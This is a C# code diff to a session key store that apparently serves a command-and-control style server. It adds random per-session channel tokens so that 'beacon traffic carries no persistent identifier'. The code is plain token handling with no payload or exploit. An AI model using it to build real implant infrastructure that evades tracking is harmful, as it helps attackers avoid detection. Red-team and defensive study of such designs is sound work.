@@ -1,4 +1,5 @@
 using System.Collections.Concurrent;
+using System.Security.Cryptography;
 using LibraNextgen.Service.Data;
 using LibraNextgen.Service.Models;
 using MongoDB.Driver;
@@ -9,10 +10,15 @@ namespace LibraNextgen.Service.Services;
 /// Holds per-agent AES-256 session keys with an in-memory cache backed by a
 /// Mongo collection, so keys survive a server restart. The cache is the
 /// authoritative hot path; Mongo is the durable store loaded once at startup.
+///
+/// Also issues opaque per-session channel tokens. The token (not the stable
+/// agent id) is what agents send on the wire, so beacon traffic carries no
+/// persistent identifier; tokens rotate on every registration.
 /// </summary>
 public class SessionKeyStore
 {
     private readonly ConcurrentDictionary<string, byte[]> _cache = new();
+    private readonly ConcurrentDictionary<string, string> _tokens = new(); // token -> agentId
     private readonly IMongoCollection<SessionKey> _collection;
 
     public SessionKeyStore(MongoDbContext context)
@@ -52,9 +58,26 @@ public class SessionKeyStore
 
     public bool TryGet(string agentId, out byte[]? key) => _cache.TryGetValue(agentId, out key);
 
+    /// <summary>Issue a fresh opaque channel token for an agent session.</summary>
+    public string IssueToken(string agentId)
+    {
+        var token = Convert.ToHexString(RandomNumberGenerator.GetBytes(16)).ToLowerInvariant();
+        _tokens[token] = agentId;
+        return token;
+    }
+
+    /// <summary>Resolve an opaque channel token to its agent id.</summary>
+    public bool TryResolveToken(string token, out string? agentId) =>
+        _tokens.TryGetValue(token, out agentId);
+
     public void Remove(string agentId)
     {
         _cache.TryRemove(agentId, out _);
+        // Drop any tokens that mapped to this agent.
+        foreach (var (token, mapped) in _tokens)
+        {
+            if (mapped == agentId) _tokens.TryRemove(token, out _);
+        }
         _ = _collection.DeleteOneAsync(Builders<SessionKey>.Filter.Eq(s => s.AgentId, agentId));
     }
 }
